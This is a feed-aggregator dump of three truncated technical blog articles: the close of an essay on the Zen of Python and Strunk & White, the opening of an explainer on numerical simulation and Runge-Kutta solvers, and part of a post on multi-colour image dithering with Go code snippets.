<p>Strunk &amp; White is the name of two people, viz William Strunk and Elwyn Brooks White. Strunk wrote <em>The Elements of Style</em>, acclaimed by the Times as one of the most influencial books since 1923 [3]. White who was Strunk’s student and reviser after the professor’s death describes the book as:</p>
<blockquote><p>
  a forty-three page summation of the case<br>
  for cleanliness, accuracy, and brevity in the use of English [4]
</p></blockquote>
<p>The effect of the book is described below, he being Strunk:</p>
<blockquote><p>
  he omitted so<br>
  many needless words, and omitted them so forcibly and with such eagerness and obvious<br>
  relish, that he often seemed in the position of having shortchanged himself — a man left<br>
  with nothing more to say yet with time to fill, a radio prophet who had out-distanced the<br>
  clock. Will Strunk got out of this predicament by a simple trick: he uttered every sentence<br>
  three times
</p></blockquote>
<p>One effect of applying the Zen would then also be lighter code files.</p>
<p><img src="https://images.unsplash.com/photo-1484108678824-e6543e2e4230?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=752&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>Master Tim heard the plea, approved the demand and responded accordingly [6]</p>
<blockquote><p>
  Clearly a job for Guido alone — although I doubt it’s one he’ll take on<br>
  (fwiw, I wish he would too!).  Here’s the outline he would start from,<br>
  though <wink>:
</wink></p></blockquote>
<pre><code>Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren't special enough to break the rules.
Although practicality beats purity.
Errors should never pass silently.
Unless explicitly silenced.
In the face of ambiguity, refuse the temptation to guess.
There should be one-- and preferably only one --obvious way to do it.
Although that way may not be obvious at first unless you're Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it's a bad idea.
If the implementation is easy to explain, it may be a good idea.
Namespaces are one honking great idea -- let's do more of those!
</code></pre>
<p>The 20th was left for Guido to fill in:</p>
<blockquote><p>
  There you go:  20 Pythonic Fec^H^H^HTheses on the nose, counting the one I’m<br>
  leaving for Guido to fill in.
</p></blockquote>
<p>Venerable Tim shares exactly how the lines came about [15]:</p>
<blockquote><p>
  It was a throwaway python-list post. But like all great triumphs of literature, it was written during commercials breaks while watching professional wrestling on TV, and munching on a ham sandwich. All true!
</p></blockquote>
<p>Yet, the author is emphatical: It’s complete and more than meets the demand [6]:</p>
<blockquote><p>
  If the answer to <em>any</em> Python design issue<br>
  isn’t obvious after reading those — well, I just give up <wink>.
</wink></p></blockquote>
<p>The above also reveals the purpose of the Zen: To address design issues. And it’s not a simple matter. Guido says [18]:</p>
<blockquote><p>
  In many ways, the design philosophy I used when creating Python is probably one of the main reasons for its ultimate success.
</p></blockquote>
<p>The Zen only gives the outlines, in contrast to Strunk and White which gives explanations and examples in addition. Thus the need for commentaries. These help the non-initiated without being a replacement for the company of the bright minds.</p>
<p>In a time of fluctuating and steered standards, the reference in the actual PEP8 document to Strunk and White in the usage of the English language caused a bitter, ugly and messy thread [7]. It caused some of the best people of the community to forego following  python-list [8], a casual reminder that being too open without limit hurts.</p>
<p><img src="https://images.unsplash.com/photo-1593297372323-2ba78409d0b1?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The Zen has become an important piece of the Python programming language. If you don’t know the Zen, you won’t strike the right chord to communicate with the community. Raymond Hettinger advises:</p>
<blockquote><p>
  Before creating more tracker items, please take time to learn about how Python’s history, how it is used, and its cultural norms.  In particular, read the Zen of Python, consider what is meant by duck-typing, what is meant by “a consenting adults language”, what is meant by over-specification, etc.  Python is quite different from Java in this regard. [13]
</p></blockquote>
<p>There’s also a practical aspect to it. It’s popular because it works [14]. It’s the golden guiding principle in pretty much everything Python.</p>
<p>Finally are the Zen points rules? What are they really. Many people take the Zen for rules. The ‘most opinionated linter ever’ at one time actually included the Zen to back their views [9]. It was situations like these which prompted me to write: The Zen Of Python Is A Joke And Here Is Why [10]. It was nice enough for Michael Kennedy and Brian Okken to call it a ‘must read’ on PythonBytes [11].</p>
<p>According to Nick Coghlan, the Zen gives you the idea, not everything [12]:</p>
<blockquote><p>
  This<br>
  challenge is reflected in the fact that the Zen of Python is<br>
  deliberately self-contradictory, as it articulates competing design<br>
  principles to take into consideration, rather than being able to<br>
  provide ironclad rules that avoid the need for human judgement in<br>
  determining which of those design guidelines are most salient in any<br>
  given situation.
</p></blockquote>
<p>Self contradiction is also coincidentally, one of the criticised aspect of Strunk and White [17].<br>
The Zen also goes beyond coding, such as shaping the thought pattern of features [12]:</p>
<blockquote><p>
  The thing we work toward as core developers, and aspiring core<br>
  developers, is good design intuition that aligns with the Zen of<br>
  Python. That doesn’t mean we’re all going to be able to perfectly<br>
  articulate that intuition in every case, and even when we can, those<br>
  explanations are themselves generally going to be backed by intuition<br>
  rather than rigorous scientific research.
</p></blockquote>
<p>If ever i myself would have added a 20th one it would have been: “Use your judgement.”. But Nick illustrated it better.</p>
<p>As for the famous <code>import this</code> command, it was Barry Warsaw’s pick. He sneaked it in a this.py in 2001 along with the ROT13 obfuscation [16]. He also mentionned that it was a time ‘when the Python community had a sense of humor’.</p>
<p><img src="https://images.unsplash.com/photo-1561739091-9d698cb277ec?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>Now the time is ripe to see what the Zen actually means. But before we should know that whatever the words<br>
and concepts mean in the Zen is not …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.pythonkitchen.com/zen-of-python-in-depth/">https://www.pythonkitchen.com/zen-of-python-in-depth/</a></em></p>]]>
            </description>
            <link>https://www.pythonkitchen.com/zen-of-python-in-depth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120869</guid>
            <pubDate>Sat, 13 Feb 2021 02:25:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Simulations Work]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120686">thread link</a>) | @janpaul123
<br/>
February 12, 2021 | http://www.anuncommonlab.com/articles/how-simulations-work/ | <a href="https://web.archive.org/web/*/http://www.anuncommonlab.com/articles/how-simulations-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div class="page"><h2>Intro</h2><p>People use computer simulations to both understand the world and design for it. Those who need to know where a satellite will be at some future time build simulations of the forces acting on the satellite and propagate its motion from some known location and velocity. Those who design robots create simulations of the environments their robots will experience in order to test how the robots make decisions and move. And those designing power plants simulate weather, energy demand, and system failures to determine the best design for a range of conditions and uncertainty.</p><p>However, despite the importance and widespread applicability, few receive education on the subject. The best information is scattered in places one might not know to look, and even most simulation textbooks are narrowly targeted to specific applications or tools. The inevitable result is that many simulations suffer from basic problems that have easy solutions.</p><p>This article will set out the critical aspects of building good simulations — that is, simulations that are accurate, easy to develop and analyze, and fast. The first sections deal with how a simulation evolves over time, as this is the core of any simulation. Further sections deal with details that make simulations easier to develop, faster, and applicable to a large number of variations. The target audience is engineers, scientists, and programmers, whether new to creating simulations or experienced. A tiny amount of vector math and calculus is assumed, making this text accessible to first- and second-year undergraduates. By the end, the reader should be able to begin building quality simulations, avoid common pitfalls, communicate the reasons for their decisions to peers, and know where to look for additional resources on specific topics and for the mathematical rigor behind it all.</p><p>We'll start with the motivation for understanding the core of how systems evolve over time.</p><h2 id="TToDt">From \(t\) to \(t+\Delta t\)</h2><p>Let’s get started with a really basic example. Let’s say we have a little moon orbiting a big planet. At some time, we know its position and velocity, and from this we want to simulate the future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon_illustration.png"><figcaption>Planet and moon</figcaption></figure><p>We know the planet pulls on the moon with gravity, so the moon’s acceleration at any point in time is:</p><p>$$\vec{a}(t) = -\frac{GM}{r(t)^2} \hat{\vec{r}}(t)$$</p><p>Here, \(\vec{a}(t)\) is the acceleration vector, \(\vec{r}(t)\) is the position of the moon with respect to the center of mass of the planet, \(\hat{\vec{r}}\) denotes a unit vector in the direction of \(\vec{r}\), \(r\) denotes the magnitude of \(\vec{r}\), and \(GM\) is the gravitational constant of the planet (remember high school?). Let’s ignore all other forces that might act on the moon for now, since this is overwhelmingly the biggest. How do we turn this into a simulator? It might seem obvious: if we know \(\vec{r}(t)\) and \(\vec{v}(t)\) for some \(t\), then at some time later, \(t + \Delta t\), if \(\vec{v}\) and \(\vec{a}\) are nearly constant across this \(\Delta t\), we would have:</p><p>$$\vec{v}(t + \Delta t) \approx \vec{v}(t) + \vec{a}(t) \Delta t$$
$$\vec{r}(t + \Delta t) \approx \vec{r}(t) + \vec{v}(t) \Delta t + \frac{1}{2} \vec{a}(t) \Delta t^2$$</p><p>Perhaps by taking a series of small \(\Delta t\) and updating the position and velocity along the way, we'll generate the future trajectory. That certainly seems easy enough, so let's try it out. We'll pick a moon in a circular orbit about the planet. It has a period, \(T\), of 30 time units (we can call them days, but it doesn't really matter) and is located at 1 distance unit from the planet. Since it's a circular orbit, the velocity has magnitude of \(2 \pi / T\) and is perpendicular to the vector from the planet to the moon. Finally, \(GM = \left(\frac{2\pi}{T}\right)^2\). We'll take a series of time steps, each \(\Delta t\) in length. Let's use \(\Delta t\) = 1 time unit, so there should be 30 time steps in the orbit, bringing the moon exactly back to where it started. Here are the results using the “multiply by \(\Delta t\)” method above, plotted on top of the actual future trajectory.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon2.png"><figcaption>Initial simulation</figcaption></figure><p>It's not a very good circle. What went wrong?</p><p>Let's zoom in on the very first time step. Note that as the moon moves, the acceleration should change to always point towards the planet, but since we've assumed the acceleration is constant across \(\Delta t\), the acceleration in this step is always to the left in this figure. This doesn't affect the position all that much, but look at the velocity compared to the true velocity (since this system has a closed form solution, we can compare to an exact value for truth). The stepped velocity wasn't “pulled back” towards the planet enough (since it always pulled left). The result is that the moon is now going a little too fast and to the outside of the true trajectory. This image is not to scale so that we might better see the small difference in the two velocities at the upper left.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon1.png"><figcaption>First time step</figcaption></figure><p>As this continues, the velocity will always have a systematic error, leaning to the outside with every step. The error builds up rapidly, and so our simulated trajectory is not useful. Of course, we used a really big time step. Only 30 time steps for the whole trajectory? That seems ambitious. Let's cut the time step down by a factor of 2. And then by another factor of 2. And then again, again, again, and again.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon3.png"><figcaption>Multiple time steps</figcaption></figure><p>With our smallest time step above we're now taking 1920 time steps, and still the error is huge (given that these are planets).</p><p>Now let's fix it. Note that the stepped trajectory is always to the outside, no matter how small the time step. What if we used some method of stepping that wouldn't have this outward tendency? Something that would take a step, see that the new acceleration is significantly different from the acceleration of the previous step, and figure out what the acceleration was across the time step? Fortunately, some great mathematicians have figured out excellent, all-purpose ways to do this. For example, applying one of the most common and all-purpose methods (it's not tailored to orbits in any way), we can achieve less error than our most precise time step above with only 11 steps. Yes, 11. These are plotted as dots on top of the true trajectory below. Let's find out how.</p><figure><img src="http://www.anuncommonlab.com/articles/how-simulations-work/img/moon4.png"><figcaption>Multiple time steps with a much better solution</figcaption></figure><h2 id="ODEs">Ordinary Differential Equations</h2><p>First, we need to establish what types of things we're going to propagate. When we have systems with some <dfn>state</dfn> (like position and velocity) at some time and we calculate the derivatives of that state (velocity and acceleration for the example) at that time, we call this an <dfn>ordinary differential equation</dfn> (ODE) (and when we're dealing with motion, we call this the <dfn>equation of motion</dfn>). We usually stick all of the parts of the state together into a column matrix and call it the <dfn>state vector</dfn>.</p><p>$$ x(t) = \begin{bmatrix} \vec{r}(t) \\ \vec{v}(t) \end{bmatrix}$$</p><p>Then we have this for the time derivative:</p><p>$$ \frac{d x(t)}{dt} \equiv \dot{x}(t) = \begin{bmatrix} \vec{v}(t) \\ \vec{a}(t) \end{bmatrix}$$</p><p>Then we describe the ODE something like this:</p><p>$$ \dot{x}(t) = f(t, x(t))$$
which just states that the derivatives depend on time and the current state and nothing else. It's also common to drop the explicit dependence on time, because it's generally understood. For our example, we have:
$$ \dot{x} = f(x) = \begin{bmatrix} \vec{v} \\ -\frac{GM}{r^2} \hat{\vec{r}} \end{bmatrix} $$</p><p>When we're keeping track of position by simulating its acceleration, it's a <dfn>second-order system</dfn>, because acceleration is the second-derivative of position. However, in terms of the state vector, \(x\), it's a <dfn>first-order system</dfn> (we calculate \(\dot{x}\) and not \(\ddot{x}\)). This can cause confusion, so we should just remember that the system is ultimately second-order, and we're just conveniently packaging up everything into \(x\) so as to use first-order techniques on \(x\).</p><p>In general, \(f(x)\) is our model of something, which might be nonlinear and even stochastic. The only assumption we make about the whole system is that it's differentiable (smooth-ish). It probably doesn't have a closed-form solution or we'd use the closed-form solution instead of simulating (our circular orbit of course has a closed-form solution, but that's just so that we can compare our simulation to something exact).</p><p>We'll talk about other types of systems (things that aren't ODEs) later. For now, this gives us plenty of great material since a plethora of physical systems are described as ODEs that boil down to \(\dot{x} = f(x)\), such as equations of motion, chemical reactions, thermodynamics, population growth, etc. Having a generic framework to describe these systems therefore lets us describe the solvers in a generic way, making them applicable to a great number of different problems.</p><h2 id="FixedStep">Fixed-Step Solvers</h2><p>In the orbit example, we held the acceleration constant across the time step, and this ultimately created a systemic bias to one side. Of course, we could easily have seen that the acceleration wasn't constant across the time step. For instance, we could have propagated by one time step, re-calculated the acceleration, and used this updated value to determine how the acceleration had changed across the time step, allowing us to revise the step. Drawing from this motivation, an excellent solution was created by Carl Runge and Martin Wilhelm Kutta a long while back. They proposed taking a series of small steps forward, using the derivatives along the way to determine the effective derivatives across the entire time step in such a way that the errors could be made very, very small.</p><h3>Runge-Kutta Fourth Order Method</h3><p>The most common Runge-Kutta method is known as “the” fourth order method, and we'll call it RK4. It involves calculating the derivatives four times like so:</p><ol><li>First, calculate the derivative at \(t\), 
$$ k_1 = f(t, x(t)) $$</li><li>Form an intermediate update of the state, 
$$ x(t + \frac{1}{2} …</li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.anuncommonlab.com/articles/how-simulations-work/">http://www.anuncommonlab.com/articles/how-simulations-work/</a></em></p>]]>
            </description>
            <link>http://www.anuncommonlab.com/articles/how-simulations-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120686</guid>
            <pubDate>Sat, 13 Feb 2021 01:39:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ditherpunk 2 – beyond 1-bit]]>
            </title>
            <description>
<![CDATA[
Score 181 | Comments 56 (<a href="https://news.ycombinator.com/item?id=26120631">thread link</a>) | @makeworld
<br/>
February 12, 2021 | https://www.makeworld.gq/2021/02/dithering.html | <a href="https://web.archive.org/web/*/https://www.makeworld.gq/2021/02/dithering.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a rel="me" href="https://sunbeam.city/@makeworld"></a>
    <header>
        <h3><span>www.makeworld.gq</span></h3>
        <nav>
<a href="https://www.makeworld.gq/">Home</a>
<a href="https://www.makeworld.gq/about/">About</a>
<a href="https://www.makeworld.gq/blog/">Blog</a>

        </nav>
    </header>
    
    
    
    
    <p>Feb 12th, 2021<br>
by <strong>makeworld</strong></p>

<p><em>Last updated: Feb. 13, 2021</em></p>

<hr>

<p><em>This post contains some images that need to be viewed at 100% size to be seen correctly. If you normally browse
at a higher zoom level than 100%, please zoom out when you get to any of the images.</em></p>

<hr>

<p>Just yesterday, I released my <a href="https://github.com/makeworld-the-better-one/dither">dithering library</a>, written in Go.
It’s the product of many hours of research, experimentation, and refactoring. I’m
excited that it’s finally out, and to see what people create with it. Personally I’d like to create a CLI dithering
tool at some point that uses it.</p>

<p>Creating this library required research into the different algorithms for dithering, and how to implement them.
Unfortunately, not all of that knowledge is easily found. It’s spread across blog posts, Wikipedia pages without
citations, old books, and code comments. Recently, Surma wrote an article called
<a href="https://surma.dev/things/ditherpunk/">Ditherpunk — The article I wish I had about monochrome image dithering</a>.
It is an invaluable resource that combines lots of knowledge about dithering into one place. The main thing missing
from the post, however, is going beyond “monochrome”. Surma shows us how to dither with a 1-bit palette of black and
white, but what about more shades of gray? What about colour images? With this blog post I’d like to explore those
techniques, taking them out of my code and into English, so you can easily apply them elsewhere.</p>

<p><strong>First off, please read Surma’s post.</strong> It explains what dithering is, how it works, and many different algorithms.
I don’t feel the need to explain these again, but merely add on what I’ve learned.</p>

<h2 id="before-we-start">Before we start</h2>

<p>An HN commenter <a href="https://news.ycombinator.com/item?id=26122642">informed me</a> that you cannot accurately represent
linear RGB with just 8-bits (0-255), you need at least 12. Because of this, I have updated the blog post to use
16-bit color (0-65535), and will be updating the library shortly. Make sure you do this in your code too!</p>

<h2 id="overview">Overview</h2>

<p>Dithering operations consist of at least two steps, applied to each pixel. Sometimes there are further steps, like
“modify these nearby pixels”, but these are the basic ones.</p>

<ol>
  <li>Modify the pixel’s colour value.</li>
  <li>Find the colour in the palette that is “closest” to that modified value and use that on the output image.</li>
</ol>

<p>Now, we know from Surma’s post that step 1 must be done with linear RGB values. Otherwise, different values will be
affected differently – for example adding 5 to each colour won’t affect all colours the same way.</p>

<p>But what about step 2? How do we find the closest colour in the palette? In 1-bit dithering we don’t have to worry
about this, because anything above 0.5 is white, and anything below is black. But when your palette colours can be
anyhere in a 3D space, it is something that needs to be figured out.</p>

<p>Perhaps surprisingly, we’re not looking for a way that matches human perception. In fact, we are using Euclidean
distance with linear RGB values, which doesn’t match human perception at all! Why is this?
Thomas Mansencal (<a href="https://github.com/KelSolaar">@KelSolaar</a>) explains it best:</p>

<blockquote>
  <p>You can factor out the observer [the human] because what you are interested in here is basically energy
conservation. The idea being that for a given pool of radiant power emitters, if you remove a certain number of
them, by how much must the radiant power of the remaining ones be increased to be the same as that of the full
pool. It is really a ratio and doing those operations in a linear space is totally appropriate!</p>
</blockquote>

<p>This helped it click for me. Dithering can be thought of as trying to reconstruct the “radiant power” of the original
pixel colours, while restricted to a certain set of “emitters”, aka the palette colours. It is only with linearized
RGB values that we can properly measure the radiant power.</p>

<h2 id="random-noise-grayscale">Random Noise (grayscale)</h2>

<p>Random noise is a good one to start with, to show the differences between 1-bit dithering and larger palettes.</p>

<p>Surma does this by basically just adding a random number from -0.5 to 0.5, and then thresholding it.</p>

<div><div><pre><code><span>grayscaleImage</span><span>.</span><span>mapSelf</span><span>(</span><span>brightness</span> <span>=&gt;</span>
  <span>brightness</span> <span>+</span> <span>(</span><span>Math</span><span>.</span><span>random</span><span>()</span> <span>-</span> <span>0.5</span><span>)</span> <span>&gt;</span> <span>0.5</span> 
    <span>?</span> <span>1.0</span> 
    <span>:</span> <span>0.0</span>
<span>);</span>
</code></pre></div></div>

<p>In my library, there are two separate random noise functions. One is for grayscale, and one is for RGB. The grayscale
one looks like this:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>max</span><span>-</span><span>min</span><span>)</span><span>+</span><span>min</span><span>))</span>
</code></pre></div></div>

<p>The math with <code>min</code> and <code>max</code> is just to put the random value in the desired range. If we clean that up it’s more
understandable:</p>

<div><div><pre><code><span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>gray</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>rand</span><span>())</span>
</code></pre></div></div>

<p><code>rand()</code> just represents a function that does whatever range we want, -0.5 to 0.5 in this case.</p>

<p>So, obviously this is quite similar to what Surma does. The heavy lifing of the dithering in this case is done by the
other code, the part that finds the best palette colour.</p>

<p>The main thing that’s worth noting here is how the rounding works. <code>roundClamp</code> rounds the value to an integer, and then
clamps it to the range 0-65535. But how is the rounding done?</p>

<p>Another <a href="https://news.ycombinator.com/item?id=26122642">HN commenter</a> shared <a href="http://www.cplusplus.com/articles/1UCRko23/">this link</a>
which discusses different rounding methods, and the problems with the way rounding is often done. The best solution is to
use a rounding function that does this:</p>

<blockquote>
  <p>Given a number exactly halfway between two values, round to the even value (zero is considered even here).</p>

  <p>round( 1.7 ) –&gt; 2 round( 2.7 ) –&gt; 3<br>
round( 1.5 ) –&gt; 2 round( 2.5 ) –&gt; 2<br>
round( 1.3 ) –&gt; 1 round( 2.3 ) –&gt; 2</p>
</blockquote>

<p>This is not really about dithering, but this is a pretty important point to get things right mathematically.
Make sure you do it! Otherwise your outputs will be biased.</p>

<h2 id="random-noise-rgb">Random Noise (RGB)</h2>

<p>Back to random noise, but for colour this time.</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxR</span><span>-</span><span>minR</span><span>)</span><span>+</span><span>minR</span><span>))</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxG</span><span>-</span><span>minG</span><span>)</span><span>+</span><span>minG</span><span>))</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>(</span><span>rand</span><span>.</span><span>Float32</span><span>()</span><span>*</span><span>(</span><span>maxB</span><span>-</span><span>minB</span><span>)</span><span>+</span><span>minB</span><span>))</span>
</code></pre></div></div>

<p>And simplified:</p>

<div><div><pre><code><span>r</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>r</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randR</span><span>())</span>
<span>g</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>g</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randG</span><span>())</span>
<span>b</span> <span>=</span> <span>roundClamp</span><span>(</span><span>float32</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>65535.0</span><span>*</span><span>randB</span><span>())</span>
</code></pre></div></div>

<p>Pretty simple, it just adds randomness in each channel. This can be done with grayscale images too, but it won’t
work very well, because grayscale colours only actually have one dimension. So it will just not add as much
randomness as you would expect.</p>

<p>Also note that usually you’ll want the random ranges to be the same for R, G, and B.</p>

<p>Here’s an example:</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/random_noise_rgb_red-green-black.png">
<figcaption>
Random Noise (palette is red, green, black)
</figcaption>
</figure>

</section>

<h2 id="ordered-dithering">Ordered Dithering</h2>

<h3 id="modifying-threshold-matrices">Modifying threshold matrices</h3>

<p>Most of the resources online that talk about ordered dithering talk about a “threshold matrix”. “Thresholding” is
how these matrices are applied for 1-bit dithering. You divide the matrix by whatever number is specified, scale
it to the colour value range, and compare it to each pixel in the image. If it’s less than the matrix value, make
it black, otherwise white. Obviously this doesn’t work with any other kind of palette. So what’s the solution?</p>

<p><a href="https://en.wikipedia.org/wiki/Ordered_dithering">Wikipedia</a> offers an answer. Unfortunately there’s no citation,
but I’ve confirmed independently that it works. Here it is with some of my own math added as well.</p>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>65535</mn><mo>×</mo><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo><mo>×</mo><mrow><mo fence="true">(</mo><mfrac><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi><mo>+</mo><mn>1</mn></mrow><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow></mfrac><mo>−</mo><mn>0.5</mn><mo fence="true">)</mo></mrow></mrow><annotation encoding="application/x-tex">(65535 \times strength) \times \left( \frac{cell + 1}{max} - 0.5 \right)</annotation></semantics></math></span></span></span>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>e</mi><mi>l</mi><mi>l</mi></mrow><annotation encoding="application/x-tex">cell</annotation></semantics></math></span></span> is a single cell of the matrix.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> is a percentage, usually a float from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>. It’s the amount the matrix will be applied to the
image. The closer to zero it is, the smaller the range of input colors that will be dithered. Colors outside
that range will be quantized. Usually you’ll want a strength of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.0</mn></mrow><annotation encoding="application/x-tex">1.0</annotation></semantics></math></span></span>, to apply the matrix and dither fully, but
sometimes reducing it can be useful, to reduce noise in the output image. It is inversely proportional to contrast –
that is, when you reduce the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span>, it is visually similar to increasing the contrast.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel’s colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that’s essentially the purpose of this – converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you’re using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you’ll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you’ve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you’re using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn’t make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it’s not the greatest. Here’s an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
